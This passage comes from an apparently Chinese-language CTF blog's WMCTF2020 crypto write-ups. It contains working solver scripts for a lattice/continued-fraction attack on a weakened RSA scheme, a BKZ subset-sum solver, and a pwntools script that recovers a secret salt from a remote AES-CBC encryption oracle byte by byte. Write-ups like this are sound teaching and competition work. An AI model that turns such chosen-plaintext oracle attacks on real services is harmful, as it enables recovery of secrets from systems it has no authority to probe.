class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[102]:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">e = getPrime(<span class="number">477</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat_cake</span><span class="params">()</span>:</span></span><br><span class="line">    p, q = getPrime(BITS), getPrime(BITS)</span><br><span class="line">    ph = (p - <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">    N = p * q</span><br><span class="line">    d = inverse(e, ph)</span><br><span class="line">    </span><br><span class="line">    cake = getPrime(BITS &gt;&gt; <span class="number">1</span> | BITS)</span><br><span class="line">    q = getPrime(BITS &lt;&lt; <span class="number">1</span> | BITS)</span><br><span class="line">    f = d</span><br><span class="line">    g = getPrime(size(q) - size(f) - <span class="number">1</span>)</span><br><span class="line">    f_inv_q = inverse(f, q)</span><br><span class="line">    h = f_inv_q * g % q</span><br><span class="line">    r = getPrime(BITS)</span><br><span class="line">    c1 = (r * h + cake) % q</span><br><span class="line">    c2 = pow(cake, <span class="number">0x10001</span>, N)</span><br><span class="line">    print(cake)</span><br><span class="line">    <span class="keyword">return</span> q, h, c1, N, c2</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[103]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_cake</span><span class="params">()</span>:</span></span><br><span class="line">    p, q = getPrime(BITS), getPrime(BITS)</span><br><span class="line">    N = p * q</span><br><span class="line">    ph = (p - <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, ph)</span><br><span class="line">    </span><br><span class="line">    cake = getPrime(BITS &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    q = getPrime(BITS &lt;&lt; <span class="number">1</span> | BITS)</span><br><span class="line">    f = d</span><br><span class="line">    g = getPrime(size(q) - size(f) - <span class="number">1</span>)</span><br><span class="line">    f_inv_q = inverse(f, q)</span><br><span class="line">    h = f_inv_q * g % q</span><br><span class="line">    r = getPrime(BITS)</span><br><span class="line">    c1 = (r * h + cake) % q</span><br><span class="line">    c2 = pow(cake, d, N)</span><br><span class="line">    <span class="keyword">return</span> q, h, c1, N, c2</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[104]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_quotients</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    a = x // y</span><br><span class="line">    quotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        quotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> quotients</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_quotients</span><span class="params">(quotients)</span>:</span></span><br><span class="line">    convergents = [(quotients[<span class="number">0</span>], <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, len(quotients) + <span class="number">1</span>):</span><br><span class="line">        quotients_partion = quotients[<span class="number">0</span>:i]</span><br><span class="line">        denom = quotients_partion[<span class="number">-1</span>]  <span class="comment"># 分母</span></span><br><span class="line">        num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">-2</span>, -len(quotients_partion), <span class="number">-1</span>):</span><br><span class="line">            num, denom = denom, quotients_partion[_] * denom + num</span><br><span class="line">        num += denom * quotients_partion[<span class="number">0</span>]</span><br><span class="line">        convergents.append((num, denom))</span><br><span class="line">    <span class="keyword">return</span> convergents</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[105]:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[106]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_d</span><span class="params">()</span>:</span></span><br><span class="line">    dAndN = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">15</span>)):</span><br><span class="line">        q, h, c1, N, c2 = make_cake()</span><br><span class="line">        quotients = rational_to_quotients(h, q)</span><br><span class="line">        convergents = convergents_from_quotients(quotients)</span><br><span class="line">        <span class="keyword">for</span> (k, f) <span class="keyword">in</span> convergents:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                g = (f * h) % q</span><br><span class="line">                f_inv_g = inverse(f, g)</span><br><span class="line">                cake = (c1 * f % q) * f_inv_g % g</span><br><span class="line">                <span class="keyword">if</span> pow(cake, f, N) == c2:</span><br><span class="line">                    dAndN.append((f, N))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> dAndN</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[107]:</span></span><br><span class="line"></span><br><span class="line">dAndN = crack_d()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[108]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_e</span><span class="params">(dAndN)</span>:</span></span><br><span class="line">    ds = [_[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> dAndN]</span><br><span class="line">    Ns = [_[<span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> dAndN]</span><br><span class="line">    M = isqrt(max(Ns))</span><br><span class="line">    A = Matrix(ZZ, len(dAndN) + <span class="number">1</span>, len(dAndN) + <span class="number">1</span>)</span><br><span class="line">    A[<span class="number">0</span>] = [M] + ds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dAndN)):</span><br><span class="line">        A[i + <span class="number">1</span>, i + <span class="number">1</span>] = -Ns[i]</span><br><span class="line">    AL = A.LLL()</span><br><span class="line">    e = AL[<span class="number">0</span>, <span class="number">0</span>] // M</span><br><span class="line">    <span class="keyword">return</span> abs(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[109]:</span></span><br><span class="line"></span><br><span class="line">guessed_e = crack_e(dAndN)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[113]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_n</span><span class="params">(e)</span>:</span></span><br><span class="line">    q, h, c1, N, c2 = eat_cake()</span><br><span class="line">    quotients = rational_to_quotients(h, q)</span><br><span class="line">    convergents = convergents_from_quotients(quotients)</span><br><span class="line">    <span class="keyword">for</span> (k, f) <span class="keyword">in</span> convergents:</span><br><span class="line">        p = GCD(int(pow(<span class="number">2</span>, f * e - <span class="number">1</span>, N) - <span class="number">1</span>), N)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> p &lt; N:</span><br><span class="line">            q = N // p</span><br><span class="line">            d = inverse(<span class="number">0x10001</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">            cake = pow(c2, d, N)</span><br><span class="line">            print(cake)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[114]:</span></span><br><span class="line"></span><br><span class="line">factor_n(guessed_e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Out[114]:</span></span><br><span class="line"></span><br><span class="line"><span class="number">1027157078764690788142214800555547316945408825954295437289921287369230545318955110388392518217927993775664997807441799234649846512106765423582377942936106014367093824346097587115033287595424792363420560894490129540416253724597810397</span></span><br><span class="line"><span class="number">1027157078764690788142214800555547316945408825954295437289921287369230545318955110388392518217927993775664997807441799234649846512106765423582377942936106014367093824346097587115033287595424792363420560894490129540416253724597810397</span></span><br></pre></td></tr></table></figure><h4 id="others">[Others]</h4><p>非预期是因为给出size(e)，所以只需eat_cake即可通过cake%g和g恢复出cake- -</p><h3 id="baby_sum-sum">baby_sum &amp; sum</h3><h4 id="题解分析-1">[题解分析]</h4><p>baby_sum中n=120，k=20 (即120维子集和问题，解向量重量为20)</p><ul><li>BKZ所约化的格基在行序shuffle后得到结果一般不同</li><li>作forced_zero降维，假设降维至105维，则要forced_zero的20个pos均落在解向量为0的pos上，概率为C(100,15)/C(120,15)</li><li>BKZ的block_size取22或以上</li></ul><p><span class="math display">\[\left[\begin{matrix}Na_{1} &amp; 1 &amp; 0 &amp; ... &amp; 0 &amp; N\\Na_{2} &amp; 0 &amp; 1 &amp; ... &amp; 0 &amp; N\\... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ...\\Na_{n} &amp; 0 &amp; 0 &amp; ... &amp; 1 &amp; N\\Nc &amp; 0 &amp; 0 &amp; ... &amp; 0 &amp; Nk\\\end{matrix}\right],N&gt;\sqrt{n}\]</span></p><p>btw，(2, 1)那个格子在本题也8太彳亍，且格基行序不shuffle，而是把Nc所在行放至首行成功率也莫名高...玄学（x</p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Random.random <span class="keyword">as</span> random</span><br><span class="line"><span class="keyword">import</span> multiprocessing <span class="keyword">as</span> mp</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> load</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(elements, c, k, r, ID=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(elements) &gt; r)</span><br><span class="line">    n = len(elements) - r <span class="comment"># reduce dim -&gt; n</span></span><br><span class="line">    forced_zero = list(range(len(elements)))</span><br><span class="line">    indexes = set(range(len(elements)))</span><br><span class="line">    coef = ceil(sqrt(n))</span><br><span class="line">    itr = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t0 = cputime()</span><br><span class="line">        random.shuffle(forced_zero)</span><br><span class="line">        zero = set(forced_zero[:r])</span><br><span class="line">        <span class="comment"># print(zero)</span></span><br><span class="line">        reduced_indexes = [elements[i] <span class="keyword">for</span> i <span class="keyword">in</span> indexes - zero]</span><br><span class="line">        A_list = [[coef * c] + [<span class="number">0</span>] * n + [coef * k]]</span><br><span class="line">        <span class="keyword">for</span> i, ele <span class="keyword">in</span> enumerate(reduced_indexes):</span><br><span class="line">            A_list.append([coef * ele] + [<span class="number">1</span> * (j == i + <span class="number">1</span>) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>)] + [coef])</span><br><span class="line">        <span class="comment"># random.shuffle(A_list) # row shuffle(extremely useful in most cases)</span></span><br><span class="line">        A = Matrix(ZZ, A_list)</span><br><span class="line">        AL = A.BKZ(block_size=<span class="number">22</span>)</span><br><span class="line">        print(<span class="string">"[&#123;&#125;] &#123;&#125; runs, cost &#123;:.3f&#125; s."</span>.format(ID, itr, cputime(t0)))</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> AL:</span><br><span class="line">            <span class="keyword">if</span> all(line[i] == <span class="number">0</span> <span class="keyword">or</span> line[i] == <span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n + <span class="number">2</span>)) <span class="keyword">or</span> all(line[i] == <span class="number">0</span> <span class="keyword">or</span> line[i] == <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n + <span class="number">2</span>)):</span><br><span class="line">                <span class="keyword">if</span> <span class="number">-1</span> <span class="keyword">in</span> line:</span><br><span class="line">                    line = -line</span><br><span class="line">                print(<span class="string">"[&#123;&#125;] &#123;&#125; success! &#123;&#125; &#123;&#125;"</span>.format(ID, itr, line[<span class="number">1</span>:<span class="number">-1</span>], zero))</span><br><span class="line">                part_sol = line[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">                sol = <span class="string">''</span></span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(len(elements)):</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> zero:</span><br><span class="line">                        sol += <span class="string">'0'</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        sol += str(part_sol[j])</span><br><span class="line">                        j += <span class="number">1</span></span><br><span class="line">                print(<span class="string">"You got it ===&gt; &#123;&#125;"</span>.format(sol))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        itr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    CPU_CORE_NUM = <span class="number">8</span> <span class="comment"># 8核</span></span><br><span class="line">    c, elements = load(open(<span class="string">"data"</span>, <span class="string">"r"</span>))</span><br><span class="line">    k = <span class="number">20</span></span><br><span class="line">    r = <span class="number">15</span> <span class="comment"># 15-dim lower</span></span><br><span class="line">    crack_ID = partial(crack, elements, c, k, r) <span class="comment"># 高阶偏函数</span></span><br><span class="line">    <span class="keyword">with</span> mp.Pool(CPU_CORE_NUM) <span class="keyword">as</span> pool:</span><br><span class="line">        status = pool.imap_unordered(crack_ID, range(<span class="number">1</span>, <span class="number">1</span> + CPU_CORE_NUM))</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> status:</span><br><span class="line">            <span class="keyword">if</span> s:</span><br><span class="line">                pool.terminate()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>顺便复习了一次python的多进程- -</p><p>(注：脚本中行序shuffle被注释，因为Nc行放置首行一般出的都很快...不知道why)</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-03_23-20-00.png"></p><h4 id="others-1">[Others]</h4><p>Sum没跑- -祥哥说测题的时候要300+ cpu hours，震撼我妈</p><p><a href="Sum_wp.pdf">Click Here to Download Soreat_u's Official WriteUp</a></p><h3 id="game">Game</h3><h4 id="题解分析-2">[题解分析]</h4><p>AES-CBC的选择明文攻击，即<span class="math inline">\(mt\)</span>可控，返回<span class="math inline">\(ct=E_{k}(mt||salt)\)</span>的oracle</p><p>该oracle下，如图所示，在任意分组中异或后前15bits可控，即可爆破获得未知LSB</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-05_16-15-01.png"></p><p>发送<code>b"\x00"*15</code>至服务器，则明文第一个分组为<code>b"\x00"*15+salt[0]</code>，截取<code>cipher=ct[:16], known_iv=iv, iv=ct[-16:]</code>（Crypto.Cipher.AES的CBC模式iv是会随着加密行为更新的- -||，👴开debug后发现加密相同明文得到不同密文...tcl，所以必需在每次encrypt后更新iv=ct[-16:]）</p><p>再爆破LSB，即发送<code>xor(b"\x00"*15+lsb, known_iv, iv)</code>至服务器(爆破过程记得更新iv)，当ct[:16]=cipher时，lsb正确</p><p>得到salt[0]后，类似发送14bits, 13bits, ...至服务器，得到salt[1:16]，但server判断len(mt)≠0，因此在爆破salt[15]时，prefix长度应为16</p><p>下图为爆破salt[16]的示意图</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-05_22-21-36.png"></p><p>和爆破salt[0]时一样，发送<code>b"\x00"*15</code>，但此时cipher对应第二个分组，且known_iv为ct[:16]</p><p>利用已知的salt[1:16]即可爆破LSB，获得salt[16]，后续比特操作均类似</p><h4 id="exp-2">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="comment"># from tqdm import tqdm</span></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = re.findall(<span class="string">r"XXXX\+([^\)]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    cipher = re.findall(<span class="string">r"== ([^\n]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me XXXX: "</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_lsb</span><span class="params">(known, cipher, known_iv, iv)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(known) == <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">        mt = known + bytes([lsb])</span><br><span class="line">        new_iv = xor(known_iv, iv)</span><br><span class="line">        mt = hexlify(xor(mt, new_iv))</span><br><span class="line">        io.sendlineafter(<span class="string">"(in hex): "</span>, mt)</span><br><span class="line">        ct = unhexlify(io.recvline().strip())</span><br><span class="line">        iv = ct[<span class="number">-16</span>:]</span><br><span class="line">        <span class="keyword">if</span> ct[:<span class="number">16</span>] == cipher:</span><br><span class="line">            print(hex(lsb)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">"0"</span>), end=<span class="string">""</span>)</span><br><span class="line">            <span class="keyword">return</span> bytes([lsb]), iv</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"[!] Not Found!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"IV"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    iv = unhexlify(re.findall(<span class="string">r"is: ([^\n]+)"</span>, msg)[<span class="number">0</span>])</span><br><span class="line">    known = <span class="string">b"\x00"</span> * <span class="number">15</span></span><br><span class="line">    salt = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">15</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">            prefix = hexlify(<span class="string">b"\x00"</span> * j)</span><br><span class="line">            io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">            io.sendlineafter(<span class="string">"(in hex): "</span>, prefix)</span><br><span class="line">            resp = unhexlify(io.recvline().strip())</span><br><span class="line">            cipher = resp[i*<span class="number">16</span>:(i+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                known_iv = resp[(i<span class="number">-1</span>)*<span class="number">16</span>:i*<span class="number">16</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                known_iv = iv</span><br><span class="line">            iv = resp[<span class="number">-16</span>:]</span><br><span class="line">            lsb, iv = crack_lsb(known, cipher, known_iv, iv)</span><br><span class="line">            known = known[<span class="number">1</span>:] + lsb</span><br><span class="line">            salt += lsb</span><br><span class="line">        prefix = hexlify(<span class="string">b"\x00"</span> * <span class="number">16</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">"(in hex): "</span>, prefix)</span><br><span class="line">        resp = unhexlify(io.recvline().strip())</span><br><span class="line">        cipher = resp[(i+<span class="number">1</span>)*<span class="number">16</span>:(i+<span class="number">2</span>)*<span class="number">16</span>]</span><br><span class="line">        known_iv = resp[i*<span class="number">16</span>:(i+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        iv = resp[<span class="number">-16</span>:]</span><br><span class="line">        lsb, iv = crack_lsb(known, cipher, known_iv, iv)</span><br><span class="line">        known = known[<span class="number">1</span>:] + lsb</span><br><span class="line">        salt += lsb</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(in hex): "</span>, hexlify(salt))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    crack_salt()</span><br><span class="line">    print(<span class="string">"\n"</span> + io.recvline().strip().decode())</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="others-2">[Others]</h4><p>48*(256+1)次encrypt，本地测秒出，挂载云服务器大概给出的alram(1200)也绰绰有余</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-05_22-27-56.png"></p><p>i春秋公益赛赵总出了题挺类似的(NewsWebsite)，也是<span class="math inline">\(ct=E_{k}(mt||salt)\)</span>的oracle，但是是ECB_MODE，<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuoj.cn</a>上有复现环境，感兴趣可以去van~</p><h3 id="idiot-box">idiot box</h3><h4 id="题解分析-3">[题解分析]</h4><p><a href="https://0xdktb.top/2020/04/11/Summary-of-Crypto-in-CTF-Block/#%E5%B7%AE%E5%88%86%E5%88%86%E6%9E%90">Click Here to View the WriteUp</a></p><h4 id="others-3">[Others]</h4><p>SU用的也是二轮迭代差分特征，但似乎更好些（甚至让我觉得普适性的1-R差分攻击是个憨憨...</p><p>图1是我所用四条差分路径其中的一条（对应的不是WMCTF上发布的版本，是我之前自己测题的第一版，难度会更大些，图懒得改了- -btw祥哥推荐的<a href="https://draw.io/" target="_blank" rel="noopener">draw.io</a>画图真的好用）</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/idiot_box.png"></p><p>而图2是祥哥所用的差分路径（对应的是WMCTF上发布的版本，但是一条就能出最后一轮完整的子密钥）</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Screen Shot 2020-08-03 at 5.47.03 AM.png" style="zoom:50%;"></p><p>差异就在于是2-R差分攻击，T_L'已知，但T_R'未知，且在这里T_R'据说可以激活第六轮全部八个S盒，所以能分段8次得到完整子密钥</p><p>而1-R攻击给出的差分路径使得l'和r'均固定（相较于2-R差分攻击具备了去噪能力），但相应的，这条路径的r'也只能激活第六轮的Sbox[1]和Sbox[2]，即只能攻击得到第六轮子密钥的前12bit，剩下比特再通过相同方法得到3条差分路径，直至攻击恢复出完整子密钥</p><p>有亿点点憨啊1-R攻击这么看起来...wtcl</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(中国电信2020天翼杯) - Crypto</title>
      <link href="/2020/07/31/WriteUp-%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A12020%E5%A4%A9%E7%BF%BC%E6%9D%AF-Crypto/"/>
      <url>/2020/07/31/WriteUp-%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A12020%E5%A4%A9%E7%BF%BC%E6%9D%AF-Crypto/</url>
      
